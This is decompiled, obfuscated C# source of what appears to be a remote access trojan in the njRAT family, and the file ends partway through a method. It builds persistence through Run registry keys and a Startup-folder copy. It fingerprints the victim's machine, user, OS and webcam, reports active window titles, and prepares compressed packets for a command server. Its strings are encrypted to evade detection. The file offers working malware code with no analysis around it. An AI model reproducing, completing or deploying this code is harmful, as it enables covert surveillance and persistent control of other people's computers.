using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace ns0;

public class GClass2
{
	public string string_0;

	public string string_1;

	public string string_2;

	public Mutex mutex_0;

	public string string_3;

	public string string_4;

	public string string_5;

	public string string_6;

	public string string_7;

	public bool bool_0;

	public string string_8;

	public bool bool_1;

	public GClass0 gclass0_0;

	public string string_9;

	public GClass3 gclass3_0;

	public object object_0;

	private object object_1;

	public bool bool_2;

	public object object_2;

	private string string_10;

	public object object_3;

	public GClass2()
	{
		//IL_0540: Unknown result type (might be due to invalid IL or missing references)
		//IL_054a: Expected O, but got Unknown
		string_0 = GClass4.smethod_0("wŤɤ\u034bѳԭوݶࡕफ़\u0a50ବ\u0c51\u0d52\u0e7aམ၃ᅆቄፅᑙᕉᙀᝎᡙᥲᨻ\u1b40᱙ᵒṈὉ⁖⅕≋⌼");
		string_1 = new string(new char[6] { '0', '.', '5', '.', '0', 'E' });
		string_2 = GClass4.smethod_0("");
		mutex_0 = null;
		string_3 = GClass4.smethod_0("Išɺ\u0368ѫՠتݦ\u087a।");
		string_4 = GClass4.smethod_0("[Ÿɦ\u036fѵէ٨\u0740ࡢॶ\u0a60");
		string_5 = GClass4.smethod_0("\u0013ĪȬ\u032eФԩٸݸ\u082bथੳବణ൰ว༩\u1072ᅬሽጵᑪᕪᘻ\u173bᡪ\u1937\u1a65᭠\u1c32ᵠḱἲ");
		string_6 = GClass4.smethod_0("gűɡ\u033cѸծ٭ݦࡩॹਤ୳౩൷\u0e72ཪဪᅬተ፦");
		string_7 = GClass4.smethod_0("5Ĳȵ\u0336");
		bool_0 = Conversions.ToBoolean(GClass4.smethod_0("Pűɷ\u0364"));
		string_8 = new string(new char[5] { '|', '\'', '|', '\'', '|' });
		bool_1 = Conversions.ToBoolean(GClass4.smethod_0("CťɯͱѤ"));
		gclass0_0 = new GClass0();
		string_9 = new string(new char[7] { '[', 'e', 'n', 'd', 'o', 'f', ']' });
		gclass3_0 = null;
		object_0 = new FileInfo(Application.get_ExecutablePath());
		bool_2 = false;
		object_2 = null;
		string_10 = new string(new char[45]
		{
			'S', 'o', 'f', 't', 'w', 'a', 'r', 'e', '\\', 'M',
			'i', 'c', 'r', 'o', 's', 'o', 'f', 't', '\\', 'W',
			'i', 'n', 'd', 'o', 'w', 's', '\\', 'C', 'u', 'r',
			'r', 'e', 'n', 't', 'V', 'e', 'r', 's', 'i', 'o',
			'n', '\\', 'R', 'u', 'n'
		});
		object_3 = (object)new Computer();
	}

	public void method_0()
	{
		//IL_0459: Unknown result type (might be due to invalid IL or missing references)
		//IL_0463: Expected O, but got Unknown
		string_2 = string_5;
		if (Interaction.Command() != null && Interaction.Command().Length > 0)
		{
			string[] array = Strings.Split(Interaction.Command(), new string(new char[1] { ':' }), -1, (CompareMethod)0);
			string text = array[0];
			if (Operators.CompareString(text, new string(new char[2] { 'U', 'P' }), false) == 0)
			{
				try
				{
					NewLateBinding.LateCall(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, GClass4.smethod_0("ZŢɡ\u036cѷշ\u0670ݸ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("HſɻͺѢըٱݑ\u0870१ੳ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("[Ţɲ\u0353ѥկٷݤ"), new object[2]
					{
						GClass4.smethod_0("fŨ"),
						GClass4.smethod_0(" ")
					}, (string[])null, (Type[])null, (bool[])null, true);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				try
				{
					object processById = Process.GetProcessById(Conversions.ToInteger(array[1]));
					NewLateBinding.LateCall(processById, (Type)null, GClass4.smethod_0("\\ūɠͼсթٷ\u0741\u087b५\u0a75"), new object[1] { 5000 }, (string[])null, (Type[])null, (bool[])null, true);
					try
					{
						NewLateBinding.LateCall(processById, (Type)null, GClass4.smethod_0("CůɶʹѬձ٤"), new object[0], (string[])null, (Type[])null, (bool[])null, true);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					Thread.Sleep(5000);
					ProjectData.ClearProjectError();
				}
			}
			else if (Operators.CompareString(text, new string(new char[2] { '.', '.' }), false) == 0)
			{
				Thread.Sleep(5000);
			}
		}
		method_29();
		try
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (method_28(new FileInfo(process.MainModule!.FileName), (FileInfo)object_0) && process.Id > Process.GetCurrentProcess().Id)
					{
						ProjectData.EndApp();
					}
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			Mutex.OpenExisting(string_2);
			ProjectData.EndApp();
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			mutex_0 = new Mutex(initiallyOwned: true, string_2);
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.EndApp();
			ProjectData.ClearProjectError();
		}
		object obj = new Thread(method_26, 1);
		NewLateBinding.LateCall(obj, (Type)null, GClass4.smethod_0("VŰɢͰѵ"), new object[0], (string[])null, (Type[])null, (bool[])null, true);
		if (bool_0)
		{
			gclass0_0.string_0 = string_5 + new string(new char[4] { '.', 'e', 'x', 'e' });
			gclass0_0.method_0();
		}
		try
		{
			gclass3_0 = new GClass3();
			obj = new Thread(gclass3_0.method_3, 1);
			NewLateBinding.LateCall(obj, (Type)null, GClass4.smethod_0("VŰɢͰѵ"), new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		int num = 0;
		int num2 = 0;
		string text2 = GClass4.smethod_0("");
		if (bool_1)
		{
			try
			{
				SystemEvents.add_SessionEnding((SessionEndingEventHandler)delegate
				{
					method_17();
				});
				method_23(1);
			}
			catch (Exception projectError9)
			{
				ProjectData.SetProjectError(projectError9);
				ProjectData.ClearProjectError();
			}
		}
		checked
		{
			while (true)
			{
				Thread.Sleep(1000);
				try
				{
					num++;
					num2++;
					if (num == 5)
					{
						try
						{
							EmptyWorkingSet((long)Process.GetCurrentProcess().Handle);
						}
						catch (Exception projectError10)
						{
							ProjectData.SetProjectError(projectError10);
							ProjectData.ClearProjectError();
						}
					}
					if (num > 10)
					{
						num = 0;
						if (bool_2 && Operators.CompareString(method_15(), text2, false) != 0)
						{
							text2 = method_15();
							if (text2 != null && text2.Length > 0)
							{
								method_25(new string(new char[3] { 'a', 'c', 't' }) + string_8 + text2);
							}
						}
					}
					if (num2 <= 7)
					{
						continue;
					}
					num2 = 0;
					try
					{
						object obj2 = NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, GClass4.smethod_0("ZŢɡ\u036cѷշ\u0670ݸ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("HſɻͺѢըٱݑ\u0870१ੳ"), new object[0], (string[])null, (Type[])null, (bool[])null);
						string text3 = GClass4.smethod_0("EŹɭ\u0369ѕհ٦\u0748ࡧॸ");
						object[] array2 = new object[2] { string_10, true };
						object[] array3 = array2;
						bool[] array4 = new bool[2] { true, false };
						object obj3 = NewLateBinding.LateGet(obj2, (Type)null, text3, array3, (string[])null, (Type[])null, array4);
						if (array4[0])
						{
							string_10 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
						}
						string text4 = GClass4.smethod_0("[Ţɲ\u0353ѥկٷݤ");
						object[] array5 = new object[2]
						{
							string_5,
							Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)'"', NewLateBinding.LateGet(object_0, (Type)null, GClass4.smethod_0("NŲɪ\u0369ъբٯݤ"), new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)new char[3] { ' ', '.', '.' })
						};
						object[] array6 = array5;
						bool[] array7 = new bool[2] { true, false };
						NewLateBinding.LateCall(obj3, (Type)null, text4, array6, (string[])null, (Type[])null, array7, true);
						if (array7[0])
						{
							string_5 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(string));
						}
					}
					catch (Exception projectError11)
					{
						ProjectData.SetProjectError(projectError11);
						ProjectData.ClearProjectError();
					}
					try
					{
						object obj4 = NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, GClass4.smethod_0("ZŢɡ\u036cѷշ\u0670ݸ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("@Ťɩ\u0368ѤՊ٧ݦ\u086c४੬\u0b64"), new object[0], (string[])null, (Type[])null, (bool[])null);
						string text5 = GClass4.smethod_0("EŹɭ\u0369ѕհ٦\u0748ࡧॸ");
						object[] array8 = new object[2] { string_10, true };
						object[] array9 = array8;
						bool[] array7 = new bool[2] { true, false };
						object obj5 = NewLateBinding.LateGet(obj4, (Type)null, text5, array9, (string[])null, (Type[])null, array7);
						if (array7[0])
						{
							string_10 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array8[0]), typeof(string));
						}
						string text6 = GClass4.smethod_0("[Ţɲ\u0353ѥկٷݤ");
						object[] array10 = new object[2]
						{
							string_5,
							Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)'"', NewLateBinding.LateGet(object_0, (Type)null, GClass4.smethod_0("NŲɪ\u0369ъբٯݤ"), new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)new char[3] { ' ', '.', '.' })
						};
						object[] array11 = array10;
						bool[] array4 = new bool[2] { true, false };
						NewLateBinding.LateCall(obj5, (Type)null, text6, array11, (string[])null, (Type[])null, array4, true);
						if (array4[0])
						{
							string_5 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array10[0]), typeof(string));
						}
					}
					catch (Exception projectError12)
					{
						ProjectData.SetProjectError(projectError12);
						ProjectData.ClearProjectError();
					}
					try
					{
						File.Copy(Conversions.ToString(NewLateBinding.LateGet(object_0, (Type)null, GClass4.smethod_0("NŲɪ\u0369ъբٯݤ"), new object[0], (string[])null, (Type[])null, (bool[])null)), Environment.GetFolderPath(Environment.SpecialFolder.Startup) + GClass4.smethod_0("]") + string_5 + GClass4.smethod_0("*Ŧɺ\u0364"), overwrite: true);
					}
					catch (Exception projectError13)
					{
						ProjectData.SetProjectError(projectError13);
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception projectError14)
				{
					ProjectData.SetProjectError(projectError14);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	public void method_1(string string_11)
	{
		try
		{
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, GClass4.smethod_0("ZŢɡ\u036cѷշ\u0670ݸ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("HſɻͺѢըٱݑ\u0870१ੳ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("OŹɯ\u0368Ѽբ\u0655ݰࡦ\u0948੧\u0b78"), new object[1] { new string(new char[9] { 'S', 'o', 'f', 't', 'w', 'a', 'r', 'e', '\\' }) + string_5 }, (string[])null, (Type[])null, (bool[])null);
			string text = GClass4.smethod_0("Oůɥ\u036dѳգ\u0653ݥ\u086fॷ\u0a64");
			object[] array = new object[1] { string_11 };
			bool[] array2 = new bool[1] { true };
			NewLateBinding.LateCall(obj, (Type)null, text, array, (string[])null, (Type[])null, array2, true);
			if (array2[0])
			{
				string_11 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public string method_2(string string_11)
	{
		try
		{
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, GClass4.smethod_0("ZŢɡ\u036cѷշ\u0670ݸ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("HſɻͺѢըٱݑ\u0870१ੳ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("OŹɯ\u0368Ѽբ\u0655ݰࡦ\u0948੧\u0b78"), new object[1] { GClass4.smethod_0("ZŧɡͲѲեٱݧ\u085d") + string_5 }, (string[])null, (Type[])null, (bool[])null);
			string text = GClass4.smethod_0("OŢɲ\u0353ѥկٷݤ");
			object[] array = new object[2]
			{
				string_11,
				GClass4.smethod_0("")
			};
			bool[] array2 = new bool[2] { true, false };
			object obj2 = NewLateBinding.LateGet(obj, (Type)null, text, array, (string[])null, (Type[])null, array2);
			if (array2[0])
			{
				string_11 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			return Conversions.ToString(obj2);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = GClass4.smethod_0("");
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public object method_3(string string_11, string string_12)
	{
		try
		{
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, GClass4.smethod_0("ZŢɡ\u036cѷշ\u0670ݸ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("HſɻͺѢըٱݑ\u0870१ੳ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("OŹɯ\u0368Ѽբ\u0655ݰࡦ\u0948੧\u0b78"), new object[1] { new string(new char[9] { 'S', 'o', 'f', 't', 'w', 'a', 'r', 'e', '\\' }) + string_5 }, (string[])null, (Type[])null, (bool[])null);
			string text = GClass4.smethod_0("[Ţɲ\u0353ѥկٷݤ");
			object[] array = new object[2] { string_11, string_12 };
			bool[] array2 = new bool[2] { true, true };
			NewLateBinding.LateCall(obj, (Type)null, text, array, (string[])null, (Type[])null, array2, true);
			if (array2[0])
			{
				string_11 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			if (array2[1])
			{
				string_12 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(string));
			}
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public string method_4()
	{
		string text = new string(new char[2] { 'l', 'v' }) + string_8;
		try
		{
			if (Operators.CompareString(method_2(GClass4.smethod_0("tů")), GClass4.smethod_0(""), false) == 0)
			{
				string text2 = text;
				string string_ = method_7(ref string_0) + new string(new char[1] { '_' }) + method_16();
				text = text2 + method_6(ref string_) + string_8;
			}
			else
			{
				string text3 = text;
				string string_ = method_2(GClass4.smethod_0("tů"));
				string string_2 = method_7(ref string_) + GClass4.smethod_0("^") + method_16();
				text = text3 + method_6(ref string_2) + string_8;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string text4 = text;
			string string_2 = method_16();
			text = text4 + method_6(ref string_2) + string_8;
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + Environment.MachineName + string_8;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			text = text + new string(new char[2] { '?', '?' }) + string_8;
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + Environment.UserName + string_8;
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			text = text + new string(new char[2] { '?', '?' }) + string_8;
			ProjectData.ClearProjectError();
		}
		text = text + method_5() + string_8;
		try
		{
			text = text + method_14(7u) + string_8;
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			text = text + new string(new char[1] { 'X' }) + string_8;
			ProjectData.ClearProjectError();
		}
		try
		{
			text = Conversions.ToString(Operators.AddObject((object)text, NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, GClass4.smethod_0("Mŭɤ\u036e"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("EŚɎͲѪթيݢ\u086f।"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("Uţɵ\u0368Ѣա٤"), new object[2]
			{
				GClass4.smethod_0("DšɤʹѪշ٬ݤ\u0875"),
				GClass4.smethod_0("")
			}, (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("Uţɵ\u0368Ѣա٤"), new object[2]
			{
				GClass4.smethod_0("Půɫ\u0360Ѭյٲ"),
				GClass4.smethod_0("Tūɯ")
			}, (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("Uţɵ\u0368Ѣա٤"), new object[2]
			{
				GClass4.smethod_0("\u00af"),
				GClass4.smethod_0("")
			}, (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("Uţɵ\u0368Ѣա٤"), new object[2]
			{
				GClass4.smethod_0("℣"),
				GClass4.smethod_0("")
			}, (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("Uţɵ\u0368Ѣա٤"), new object[2]
			{
				GClass4.smethod_0("\"ġ"),
				GClass4.smethod_0("!")
			}, (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("Uţɵ\u0368Ѣա٤"), new object[2]
			{
				GClass4.smethod_0("$Ŕɫ\u036f"),
				GClass4.smethod_0("Tūɯ")
			}, (string[])null, (Type[])null, (bool[])null)));
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			text += new string(new char[2] { '?', '?' });
			ProjectData.ClearProjectError();
		}
		text += new string(new char[2] { 'S', 'P' });
		try
		{
			string[] array = Strings.Split(Environment.OSVersion.ServicePack, new string(new char[1] { ' ' }), -1, (CompareMethod)0);
			if (array.Length == 1)
			{
				text += new string(new char[1] { '0' });
			}
			text += array[checked(array.Length - 1)];
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			text += new string(new char[1] { '0' });
			ProjectData.ClearProjectError();
		}
		try
		{
			text = ((!Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains(new string(new char[3] { 'x', '8', '6' }))) ? (text + new string(new char[4] { ' ', 'x', '8', '6' }) + string_8) : (text + new string(new char[4] { ' ', 'x', '6', '4' }) + string_8));
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			text += string_8;
			ProjectData.ClearProjectError();
		}
		text = ((!method_13()) ? (text + new string(new char[2] { 'N', 'o' }) + string_8) : (text + new string(new char[3] { 'Y', 'e', 's' }) + string_8));
		text = text + string_1 + string_8;
		text = text + new string(new char[2] { '.', '.' }) + string_8;
		text = text + method_15() + string_8;
		string text5 = GClass4.smethod_0("");
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = ((IEnumerable)NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, GClass4.smethod_0("ZŢɡ\u036cѷշ\u0670ݸ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("HſɻͺѢըٱݑ\u0870१ੳ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("OŹɯ\u0368Ѽբ\u0655ݰࡦ\u0948੧\u0b78"), new object[2]
				{
					new string(new char[9] { 'S', 'o', 'f', 't', 'w', 'a', 'r', 'e', '\\' }) + string_5,
					false
				}, (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("Jũɿ\u035cѨդٲݣࡋ॥੮୧\u0c72"), new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
				while (enumerator.MoveNext())
				{
					string text6 = Conversions.ToString(enumerator.Current);
					if (text6.Length == 32)
					{
						text5 = text5 + text6 + new string(new char[1] { ',' });
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		return text + text5;
	}

	public string method_5()
	{
		try
		{
			return ((FileInfo)object_0).LastWriteTime.ToString(new string(new char[10] { 'y', 'y', 'y', 'y', '-', 'M', 'M', '-', 'd', 'd' }));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = new string(new char[7] { 'u', 'n', 'k', 'n', 'o', 'w', 'n' });
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public string method_6(ref string string_11)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(string_11);
		return Convert.ToBase64String(bytes);
	}

	public string method_7(ref string string_11)
	{
		byte[] bytes = Convert.FromBase64String(string_11);
		return Encoding.UTF8.GetString(bytes);
	}

	public string method_8(int int_0)
	{
		VBMath.Randomize();
		Random random = new Random();
		string text = GClass4.smethod_0("");
		string text2 = new string(new char[26]
		{
			'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',
			'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't',
			'u', 'v', 'w', 'x', 'y', 'z'
		});
		for (int i = 1; i <= int_0; i = checked(i + 1))
		{
			text += Conversions.ToString(text2[random.Next(0, text2.Length)]);
		}
		return text;
	}

	public byte[] method_9(ref string string_11)
	{
		return Encoding.Default.GetBytes(string_11);
	}

	public string method_10(ref byte[] byte_0)
	{
		return Encoding.Default.GetString(byte_0);
	}

	public Array method_11(byte[] byte_0, string string_11)
	{
		object obj = new List<byte[]>();
		object obj2 = new MemoryStream();
		object obj3 = new MemoryStream();
		string[] array = Strings.Split(method_10(ref byte_0), string_11, -1, (CompareMethod)0);
		string text = GClass4.smethod_0("RŶɪͶѤ");
		object[] array2 = new object[3]
		{
			byte_0,
			0,
			array[0].Length
		};
		object[] array3 = array2;
		bool[] array4 = new bool[3] { true, false, false };
		NewLateBinding.LateCall(obj2, (Type)null, text, array3, (string[])null, (Type[])null, array4, true);
		if (array4[0])
		{
			byte_0 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(byte[]));
		}
		string text2 = GClass4.smethod_0("RŶɪͶѤ");
		object[] array5 = checked(new object[3]
		{
			byte_0,
			array[0].Length + string_11.Length,
			byte_0.Length - (array[0].Length + string_11.Length)
		});
		object[] array6 = array5;
		array4 = new bool[3] { true, false, false };
		NewLateBinding.LateCall(obj3, (Type)null, text2, array6, (string[])null, (Type[])null, array4, true);
		if (array4[0])
		{
			byte_0 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(byte[]));
		}
		string text3 = GClass4.smethod_0("BŦɥ");
		array2 = new object[1];
		object[] array7 = array2;
		object obj4 = obj2;
		array7[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj4, (Type)null, GClass4.smethod_0("SũɄͶѱգٸ"), new object[0], (string[])null, (Type[])null, (bool[])null));
		array5 = array2;
		object[] array8 = array5;
		array4 = new bool[1] { true };
		NewLateBinding.LateCall(obj, (Type)null, text3, array8, (string[])null, (Type[])null, array4, true);
		if (array4[0])
		{
			NewLateBinding.LateSetComplex(obj4, (Type)null, GClass4.smethod_0("SũɄͶѱգٸ"), new object[1] { RuntimeHelpers.GetObjectValue(array5[0]) }, (string[])null, (Type[])null, true, false);
		}
		string text4 = GClass4.smethod_0("BŦɥ");
		object[] array9 = new object[1];
		object[] array10 = array9;
		obj4 = obj3;
		array10[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj4, (Type)null, GClass4.smethod_0("SũɄͶѱգٸ"), new object[0], (string[])null, (Type[])null, (bool[])null));
		array2 = array9;
		object[] array11 = array2;
		array4 = new bool[1] { true };
		NewLateBinding.LateCall(obj, (Type)null, text4, array11, (string[])null, (Type[])null, array4, true);
		if (array4[0])
		{
			NewLateBinding.LateSetComplex(obj4, (Type)null, GClass4.smethod_0("SũɄͶѱգٸ"), new object[1] { RuntimeHelpers.GetObjectValue(array2[0]) }, (string[])null, (Type[])null, true, false);
		}
		NewLateBinding.LateCall(obj2, (Type)null, GClass4.smethod_0("CůɶʹѬձ٤"), new object[0], (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(obj3, (Type)null, GClass4.smethod_0("CůɶʹѬձ٤"), new object[0], (string[])null, (Type[])null, (bool[])null, true);
		return (Array)NewLateBinding.LateGet(obj, (Type)null, GClass4.smethod_0("SũɄͶѱգٸ"), new object[0], (string[])null, (Type[])null, (bool[])null);
	}

	public byte[] method_12(byte[] byte_0, ref bool bool_3)
	{
		checked
		{
			object[] array5;
			bool[] array3;
			if (bool_3)
			{
				object obj = new MemoryStream();
				object obj2 = new GZipStream((Stream)obj, CompressionMode.Compress, leaveOpen: true);
				string text = GClass4.smethod_0("RŶɪͶѤ");
				object[] array = new object[3] { byte_0, 0, byte_0.Length };
				object[] array2 = array;
				array3 = new bool[3] { true, false, false };
				NewLateBinding.LateCall(obj2, (Type)null, text, array2, (string[])null, (Type[])null, array3, true);
				if (array3[0])
				{
					byte_0 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(byte[]));
				}
				NewLateBinding.LateCall(obj2, (Type)null, GClass4.smethod_0("CůɶʹѬձ٤"), new object[0], (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateSet(obj, (Type)null, GClass4.smethod_0("XŨɵ\u036cѰժ٭ݯ"), new object[1] { 0 }, (string[])null, (Type[])null);
				byte[] array4 = new byte[Conversions.ToInteger(NewLateBinding.LateGet(obj, (Type)null, GClass4.smethod_0("JŠɪ\u0364Ѷթ"), new object[0], (string[])null, (Type[])null, (bool[])null)) + 1];
				string text2 = GClass4.smethod_0("VŦɣ\u0365");
				array5 = new object[3] { array4, 0, array4.Length };
				object[] array6 = array5;
				array3 = new bool[3] { true, false, false };
				NewLateBinding.LateCall(obj, (Type)null, text2, array6, (string[])null, (Type[])null, array3, true);
				if (array3[0])
				{
					array4 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(byte[]));
				}
				NewLateBinding.LateCall(obj, (Type)null, GClass4.smethod_0("CůɶʹѬձ٤"), new object[0], (string[])null, (Type[])null, (bool[])null, true);
				return array4;
			}
			object obj3 = new MemoryStream(byte_0);
			object obj4 = new GZipStream((Stream)obj3, CompressionMode.Decompress);
			byte[] array7 = new byte[4];
			NewLateBinding.LateSet(obj3, (Type)null, GClass4.smethod_0("XŨɵ\u036cѰժ٭ݯ"), new object[1] { Operators.SubtractObject(NewLateBinding.LateGet(obj3, (Type)null, GClass4.smethod_0("JŠɪ\u0364Ѷթ"), new object[0], (string[])null, (Type[])null, (bool[])null), (object)5) }, (string[])null, (Type[])null);
			string text3 = GClass4.smethod_0("VŦɣ\u0365");
			array5 = new object[3] { array7, 0, 4 };
			object[] array8 = array5;
			array3 = new bool[3] { true, false, false };
			NewLateBinding.LateCall(obj3, (Type)null, text3, array8, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				array7 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(byte[]));
			}
			int num = BitConverter.ToInt32(array7, 0);
			NewLateBinding.LateSet(obj3, (Type)null, GClass4.smethod_0("XŨɵ\u036cѰժ٭ݯ"), new object[1] { 0 }, (string[])null, (Type[])null);
			byte[] array9 = new byte[num - 1 + 1];
			string text4 = GClass4.smethod_0("VŦɣ\u0365");
			array5 = new object[3] { array9, 0, num };
			object[] array10 = array5;
			array3 = new bool[3] { true, false, true };
			NewLateBinding.LateCall(obj4, (Type)null, text4, array10, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				array9 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(byte[]));
			}
			if (array3[2])
			{
				num = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[2]), typeof(int));
			}
			NewLateBinding.LateCall(obj4, (Type)null, GClass4.smethod_0("CůɶʹѬձ٤"), new object[0], (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(obj3, (Type)null, GClass4.smethod_0("CůɶʹѬձ٤"), new object[0], (string[])null, (Type[])null, (bool[])null, true);
			return array9;
		}
	}

	[DllImport("psapi")]
	public static extern bool EmptyWorkingSet(long long_0);

	[DllImport("ntdll")]
	private static extern int NtSetInformationProcess(IntPtr intptr_0, int int_0, ref int int_1, int int_2);

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool capGetDriverDescriptionA(short short_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_11, int int_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_12, int int_1);

	public bool method_13()
	{
		checked
		{
			try
			{
				string string_ = Strings.Space(100);
				int num = 0;
				do
				{
					short short_ = (short)num;
					string string_2 = null;
